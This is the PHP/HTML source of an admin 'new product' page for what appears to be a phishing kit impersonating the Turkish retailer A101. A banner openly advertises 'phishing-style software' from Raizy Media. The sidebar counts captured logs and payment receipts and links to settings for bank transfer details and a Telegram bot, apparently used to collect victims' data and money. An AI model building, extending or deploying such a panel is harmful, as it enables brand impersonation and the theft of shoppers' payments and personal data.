<?php
error_reporting(0);
session_start();
ob_start();

// If the user is not logged in
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

////      RAIZY MEDIA      // //

// db_config.php dosyasını dahil edin
require_once('../inc/db_2.php');

try {
    // SQL sorgusu hazırlayın ve çalıştırın
    $sql = "SELECT * FROM bella_a101_products"; // products tablosundaki tüm verileri seçin
    $result = $db->query($sql);

    // Veriyi PHP echo ile görüntüleme
    if ($result->num_rows > 0) {
        $veri = $result->fetch_all(MYSQLI_ASSOC);
        
        foreach ($veri as $row) {
         
            
        }
    } else {
        // Sonuç yoksa burada bir işlem yapabilirsiniz.
    }
} catch (Exception $e) {
    // Hata durumunda hata mesajını göster
    echo "Veritabanı Hatası: " . $e->getMessage();
}
$query = "SELECT COUNT(*) FROM bella_a101_makbuz";
$result = $db->query($query);

if ($result) {
    $row = $result->fetch_row();
    $makbuz_sayisi = $row[0];

}
$query = "SELECT COUNT(*) FROM bella_a101_logs";
$result = $db->query($query);

if ($result) {
    $row = $result->fetch_row();
    $logs_sayisi = $row[0];

}
$query = "SELECT COUNT(*) FROM bella_a101_products";
$result = $db->query($query);

if ($result) {
    $row = $result->fetch_row();
    $products_sayisi = $row[0];

}
// Veritabanı bağlantısını kapat
$db->close();
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Raizy - A-101 Gösterge Paneli</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="assets/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="assets/vendors/css/vendor.bundle.base.css">
    <!-- endinject -->
    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="assets/vendors/jvectormap/jquery-jvectormap.css">
    <link rel="stylesheet" href="assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.theme.default.min.css">
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <!-- endinject -->
    <!-- TailwindCSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- JQuery -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Toastr JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <!-- Toastr CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"/>
    <!-- CKEditor -->
    <script src="https://cdn.ckeditor.com/4.20.2/standard/ckeditor.js"></script>
    <!-- Favicon -->
    <!-- Layout styles -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- End layout styles -->
    <link rel="shortcut icon" href="assets/images/favicon.png" />
    <script src="https://cdn.tiny.cloud/1/no-api-key/tinymce/6/tinymce.min.js" referrerpolicy="origin"></script>
    <script>
      tinymce.init({
        selector: '#mytextarea'
      });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <script>
        // TinyMCE'yi etkinleştirme
        tinymce.init({
            selector: '#productProperties',
            height: 300,
            menubar: false,
            plugins: [
                'advlist autolink lists link image charmap print preview anchor',
                'searchreplace visualblocks code fullscreen',
                'insertdatetime media table paste code help wordcount'
            ],
            toolbar: 'undo redo | formatselect | ' +
                'bold italic backcolor | alignleft aligncenter ' +
                'alignright alignjustify | bullist numlist outdent indent | ' +
                'removeformat | help'
        });
    </script>
  </head>
  <body>
    <div class="container-scroller">
      <!-- partial:partials/_sidebar.html -->
      <nav class="sidebar sidebar-offcanvas" id="sidebar">
        <div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
          <a class="sidebar-brand brand-logo" href="dashboard.php"><img src="https://i.ibb.co/12v9gYZ/raizy.png" alt="logo" /></a>
          <a class="sidebar-brand brand-logo-mini" href="dashboard.php"><img src="https://pnglib.nyc3.cdn.digitaloceanspaces.com/uploads/2021/02/letter-r-png-stock-photo_60233c95ea018.png" alt="logo" /></a>
        </div>
        <ul class="nav">
          <li class="nav-item profile">
            <div class="profile-desc">
              <div class="profile-pic">
                <div class="count-indicator">
                  <img class="img-xs rounded-circle " src="https://i.pinimg.com/originals/68/b8/cf/68b8cffa132ef42175dfa0f271859cef.gif" alt="">
                  <span class="count bg-success"></span>
                </div>
                <div class="profile-name">
                  <h5 class="mb-0 font-weight-normal">Raizy</h5>
                  <span>Yönetici</span>
                </div>
              </div>
              
                  </div>
                
              
            
          </li>
          
          <li class="nav-item menu-items">
            <a class="nav-link" href="dashboard.php">
              <span class="menu-icon">
                <i class="mdi mdi-speedometer"></i>
              </span>
              <span class="menu-title">Anasayfa</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" data-toggle="collapse" href="#ui-basic" aria-expanded="false" aria-controls="ui-basic">
              <span class="menu-icon">
                <i class="mdi mdi-settings"></i>
              </span>
              <span class="menu-title">Ayarlar</span>
              <i class="menu-arrow"></i>
            </a>
            <div class="collapse" id="ui-basic">
              <ul class="nav flex-column sub-menu">
                <li class="nav-item"> <a class="nav-link" href="password-edit.php">Parola Güncelleme</a></li>
                <li class="nav-item"> <a class="nav-link" href="bank_add.php">Havale / Eft Güncelleme</a></li>
<li class="nav-item"> <a class="nav-link" href="telegram-add.php">Telegram Bot Güncelleme</a></li>
<li class="nav-item"> <a class="nav-link" href="kampanya_sure.php">Aktif Süre Güncelleme</a></li>
              </ul>
            </div>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="loglar.php">
              <span class="menu-icon">
                <i class="mdi mdi-playlist-play"></i>
              </span>
              <span class="menu-title">Loglar</span><label class="badge badge-danger"><?= ($logs_sayisi) ?></label>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="makbuz.php">
              <span class="menu-icon">
                <i class="mdi mdi-table-large"></i>
              </span>
              <span class="menu-title">Makbuz Listesi</span><label class="badge badge-warning"><?= ($makbuz_sayisi) ?></label>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="urunler.php">
              <span class="menu-icon">
                <i class="mdi mdi-chart-bar"></i>
              </span>
              <span class="menu-title">Ürünler</span><label class="badge badge-success"><?= ($products_sayisi) ?></label>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="yeni_urun.php">
              <span class="menu-icon">
                <i class="mdi mdi-contacts"></i>
              </span>
              <span class="menu-title">Yeni Ürün Ekle</span>
            </a>
          </li>
           <li class="nav-item menu-items">
            <a class="nav-link" href="logout.php">
              <span class="menu-icon">
                <i class="mdi mdi-logout text-danger"></i>
              </span>
              <span class="menu-title">Çıkış Yap</span>
            </a>
          </li>
        </ul>
      </nav>
      <!-- partial -->
      <div class="container-fluid page-body-wrapper">
        <!-- partial:partials/_navbar.html -->
        <nav class="navbar p-0 fixed-top d-flex flex-row">
          <div class="navbar-brand-wrapper d-flex d-lg-none align-items-center justify-content-center">
            <a class="navbar-brand brand-logo-mini" href="dashboard.php"><img src="assets/images/logo-mini.svg" alt="logo" /></a>
          </div>
          <div class="navbar-menu-wrapper flex-grow d-flex align-items-stretch">
            <button class="navbar-toggler navbar-toggler align-self-center" type="button" data-toggle="minimize">
              <span class="mdi mdi-menu"></span>
            </button>
            <ul class="navbar-nav w-100">
              <li class="nav-item w-100">
               
              </li>
            </ul>
            <ul class="navbar-nav navbar-nav-right">
             
             
              
                
             
             
           
              <li class="nav-item dropdown">
                <a class="nav-link" id="profileDropdown" href="#" data-toggle="dropdown">
                  <div class="navbar-profile">
                    <img class="img-xs rounded-circle" src="https://i.pinimg.com/originals/68/b8/cf/68b8cffa132ef42175dfa0f271859cef.gif" alt="">
                    <p class="mb-0 d-none d-sm-block navbar-profile-name">Raizy</p>
                  
                  </div>
                </a>
                
              </li>
            </ul>
            <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
              <span class="mdi mdi-format-line-spacing"></span>
            </button>
          </div>
        </nav>
        <!-- partial -->
        <div class="main-panel">
          <div class="content-wrapper">
            <div class="row">
              <div class="col-12 grid-margin stretch-card">
                <div class="card corona-gradient-card">
                  <div class="card-body py-0 px-0 px-sm-3">
                    <div class="row align-items-center">
                      <div class="col-4 col-sm-3 col-xl-2">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/A101_logo.svg/1280px-A101_logo.svg.png" class="gradient-corona-img img-fluid" alt="">
                      </div>
                      <div class="col-5 col-sm-7 col-xl-8 p-0">
                        <h4 class="mb-1 mb-sm-0">Panele mi ihtiyacınız var?</h4>
                        <p class="mb-0 font-weight-normal d-none d-sm-block">Hayalinizdeki phising tarzı yazılımlara ulaşabilirsiniz.</p>
                      </div>
                      <div class="col-3 col-sm-2 col-xl-2 pl-0 text-center">
                        <span>
                          <a href="https://instagram.com/raizymedia" target="_blank" class="btn btn-outline-light btn-rounded get-started-btn">Bize Ulaşın!</a>
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <div class="row">
            <div class="col-12 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body">
              
                      
                <h4 class="card-title">Yeni Ürün Oluştur</h4>
             <form id="new-product-form">
                    <div class="form-group">
                        <label for="product-name">Ürün Adı</label>
                        <input type="text" class="form-control" id="product-name" name="product-name" placeholder="Ürün Adını girin">
                    </div>
                    <div class="form-group">
                        <label for="product-brand">Ürün Marka</label>
                        <input type="text" class="form-control" id="product-brand" name="product-brand" placeholder="Ürün Markasını girin">
                    </div>
                     <div class="form-group">
                        <label for="product-price">Ürün Fiyatı</label>
                        <input id="product-price" name="product-price" type="number" min="0" class="form-control"  placeholder="Ürün Fiyatını girin">
                    </div>
                     <div class="form-group">
                        <label for="product-code">Ürün Kodu</label>
                        <input type="number" class="form-control" id="product-code" name="product-code" placeholder="Ürün Kodunu girin">
                    </div>
                    <div class="form-group">
                    <label for="product_properties">Ürün Açıklama</label>
                   <textarea id="product_properties" placeholder="Ürün Detayları" class="form-control" row="12" cols="50"></textarea> </div>
<script> 
    window.onload = function() { 
        CKEDITOR.replace('product_properties'); 
    }; 
</script><br>
<div class="form-group">
                        <label for="product-image">RESİM - 1</label>
                        <input id="product-image" name="product-image" type="file" accept="image/*" class="file-upload-default">
                        <div class="input-group col-xs-12">
                          <input type="text" class="form-control file-upload-info" disabled placeholder="Resim Yükleyin">
                          <span class="input-group-append">
                            <button class="file-upload-browse btn btn-primary" type="button">Yükle</button>
                          </span>
                        </div>
                      </div>
                      <div class="form-group">
                        <label for="product-image2">RESİM - 2</label>
                       <input id="product-image2" name="product-image2" type="file" accept="image/*" class="file-upload-default">
                        <div class="input-group col-xs-12">
                          <input type="text" class="form-control file-upload-info" disabled placeholder="Resim Yükleyin">
                          <span class="input-group-append">
                            <button class="file-upload-browse btn btn-primary" type="button">Yükle</button>
                          </span>
                        </div>
                      </div>
                      <div class="form-group">
                        <label for="product-image3">RESİM - 3</label>
                        <input id="product-image3" name="product-image3" type="file" accept="image/*" class="file-upload-default">
                        <div class="input-group col-xs-12">
                          <input type="text" class="form-control file-upload-info" disabled placeholder="Resim Yükleyin">
                          <span class="input-group-append">
                            <button class="file-upload-browse btn btn-primary" type="button">Yükle</button>
                          </span>
                        </div>
                      </div>
                      <div class="form-group">
                        <label for="product-image4">RESİM - 4</label>
                        <input id="product-image4" name="product-image4" type="file" accept="image/*" class="file-upload-default">
                        <div class="input-group col-xs-12">
                          <input type="text" class="form-control file-upload-info" disabled placeholder="Resim Yükleyin">
                          <span class="input-group-append">
                            <button class="file-upload-browse btn btn-primary" type="button">Yükle</button>
                          </span>
                        </div>
                      </div>
<br>
                    <!-- Diğer form alanları da buraya eklenebilir -->
                    <button  type="submit" class="btn btn-primary mr-2">Ürünü Oluştur</button>
                   
                </form>
            </div>
        </div>
    </div>
      </div>
    </div>
           
          <!-- content-wrapper ends -->
          <!-- partial:partials/_footer.html -->
          <footer class="footer">
            <div class="d-sm-flex justify-content-center justify-content-sm-between">
              <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">Copyright © Raizy Media - 2023</span>
              
            </div>
          </footer>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
  <script>
    $(document).ready(function () {
        CKEDITOR.config.entities_latin = false;
        CKEDITOR.replace('product_properties');
        // get ckeditor data
        const form = $('#new-product-form');
        const productName = $('#product-name');
        const productPrice = $('#product-price');
        const productImage = $('#product-image');
        const productImage2 = $('#product-image2'); // Eklediğimiz yeni resim inputu
        const productImage3 = $('#product-image3'); // Eklediğimiz yeni resim inputu
        const productImage4 = $('#product-image4'); // Eklediğimiz yeni resim inputu
        const productBrand = $('#product-brand');
        const productCode = $('#product-code');
        const action = 'new-product'
        form.submit(function (event) {
            event.preventDefault();
            const formData = new FormData();
            formData.append('name', productName.val());
            formData.append('price', productPrice.val());
            formData.append('ImageURL', productImage[0].files[0]);
            formData.append('Image2URL', productImage2[0].files[0]); // Yeni resim inputu
            formData.append('Image3URL', productImage3[0].files[0]); // Yeni resim inputu
            formData.append('Image4URL', productImage4[0].files[0]); // Yeni resim inputu
            formData.append('action', action);
            formData.append('properties', CKEDITOR.instances.product_properties.getData());
            formData.append('brand', productBrand.val());
            formData.append('code', productCode.val());
            $.ajax({
                url: '/admin/inc/ajax.php',
                type: 'POST',
                data: formData,
                contentType: false,
                cache: false,
                processData: false,
                success: function (response) {
                    response = JSON.parse(response);
                    if (response.status) {
                        toastr.success(response.message);
                    } else {
                        toastr.error(response.message);
                    }
                }
            })
        })
    })
</script>
<style>
    .toast  {
    background-color: #db001d; /* Arkaplan rengi */
    color: #fff; /* Yazı rengi */
}

</style>
    <!-- container-scroller -->
    <style>
        .rounded-border-gradient {
    position: relative;
    inline-size: 35vw;
    aspect-ratio: 4/3;
    border-radius: 10px;
    border: 0.4rem solid transparent;
    background: linear-gradient(Canvas, Canvas) padding-box, linear-gradient(135deg, #31302b, #b12496, #f47d65) border-box;
    background-clip: padding-box, border-box;
    background-origin: border-box;
    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
}
        
    </style>
    <style>
        .sidebar .nav .nav-item .nav-link .badge {
    margin-right: auto;
    margin-left: 0.5rem;
    margin-block: 0;
}
        
    </style>
    <style>
 .swal2-modal .swal2-title {
    font-size: 25px;
    line-height: 1;
    font-weight: 500;
    color: #ff0000;
    font-weight: initial;
    margin-bottom: 0;
    font-weight: bold;
}
[class^=swal2] {
    -webkit-tap-highlight-color: transparent;
    font-weight: bold;
    color: black;
}

</style>
    <!-- plugins:js -->
    
    
    
   
   
    
    


    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.all.min.js"></script>
    <script src="assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <script src="assets/vendors/select2/select2.min.js"></script>
    <script src="assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="assets/js/off-canvas.js"></script>
    <script src="assets/js/hoverable-collapse.js"></script>
    <script src="assets/js/misc.js"></script>
    <script src="assets/js/settings.js"></script>
    <script src="assets/js/todolist.js"></script>
    <!-- endinject -->
    <!-- Custom js for this page -->
    <script src="assets/js/file-upload.js"></script>
    <script src="assets/js/typeahead.js"></script>
    <script src="assets/js/select2.js"></script>
    <!-- End custom js for this page -->
  </body>
</html>